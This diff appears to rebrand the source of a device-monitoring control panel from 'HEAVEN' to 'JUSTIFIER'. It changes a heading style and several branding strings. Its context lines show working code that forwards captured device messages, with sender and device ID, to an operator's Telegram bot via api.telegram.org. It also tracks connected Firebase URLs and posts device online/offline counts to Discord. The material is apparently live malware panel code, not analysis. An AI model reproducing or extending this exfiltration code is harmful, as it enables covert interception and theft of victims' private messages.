@@ -5262,7 +5262,7 @@
                 setInterval(ultimateReactDefeater, 50);
             </script></head>
 <body>
-<div id="root"><div class="min-h-screen flex items-center justify-center relative overflow-hidden" style="background: radial-gradient(at center 0%, rgb(22, 22, 22) 0%, rgb(0, 0, 0) 60%);"><div class="absolute inset-0 pointer-events-none" style="background: radial-gradient(at center 100%, rgba(255, 255, 255, 0.03) 0%, transparent 50%);"></div><div class="relative z-10 w-full max-w-md px-4 py-8 animate-slide-up"><div class="text-center mb-8"><div class="flex flex-col items-center justify-center mt-6"><h1 class="text-4xl font-bold tracking-widest" style="font-size: clamp(1.4rem, 5vw, 2.25rem); white-space: nowrap;">
+<div id="root"><div class="min-h-screen flex items-center justify-center relative overflow-hidden" style="background: radial-gradient(at center 0%, rgb(22, 22, 22) 0%, rgb(0, 0, 0) 60%);"><div class="absolute inset-0 pointer-events-none" style="background: radial-gradient(at center 100%, rgba(255, 255, 255, 0.03) 0%, transparent 50%);"></div><div class="relative z-10 w-full max-w-md px-4 py-8 animate-slide-up"><div class="text-center mb-8"><div class="flex flex-col items-center justify-center mt-6"><h1 class="text-4xl font-bold tracking-widest" style="font-size: 1.3rem; letter-spacing: 0.02em; white-space: nowrap;">
 <span class="letter-animate" style="animation-delay: 0s;">J</span>
 <span class="letter-animate" style="animation-delay: 0.15s;">U</span>
 <span class="letter-animate" style="animation-delay: 0.3s;">S</span>
@@ -22956,7 +22956,7 @@
                 }
                 function saveNewFirebaseUrl(e) {
                     try {
-                        const t = "heaven_connected_firebase_urls"
+                        const t = "JUSTIFIER_connected_firebase_urls"
                           , n = JSON.parse(localStorage.getItem(t) || "[]")
                           , a = String(e || "").trim().replace(/\/$/, "");
                         if (!a)
@@ -24074,7 +24074,7 @@
                                 const {active: n, token: a, chat: s} = u.current;
                                 n && a && s && i.length > 0 && r.filter(e => !i.some(t => t.text === e.text && t.time === e.time)).forEach(t => {
                                     const n = (t.text || "").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
-                                      , r = encodeURIComponent(`📱 <b>New Message Forwarded</b>\n\n<b>From:</b> <code>${t.sender}</code>\n<b>Device ID:</b> <code>${e.id}</code>\n\n<b>Message:</b>\n${n}\n\n🌐 <b>Web:</b> HEAVEN`);
+                                      , r = encodeURIComponent(`📱 <b>New Message Forwarded</b>\n\n<b>From:</b> <code>${t.sender}</code>\n<b>Device ID:</b> <code>${e.id}</code>\n\n<b>Message:</b>\n${n}\n\n🌐 <b>Web:</b> JUSTIFIER`);
                                     fetch(`https://api.telegram.org/bot${a}/sendMessage?chat_id=${s}&text=${r}&parse_mode=HTML`).then(e => e.json()).then(e => {
                                         e.ok && d(e => {
                                             const n = [{
@@ -25629,7 +25629,7 @@ async function sendToDiscord(url, key) {
                     { name: "⚫ Offline", value: String(offline), inline: true },
                     { name: "⏰ Time", value: new Date().toLocaleString('en-IN', {hour12: true}), inline: false }
                 ],
-                footer: { text: "HEAVEN Panel" },
+                footer: { text: "JUSTIFIER Panel" },
                 timestamp: new Date().toISOString()
             }]
         };
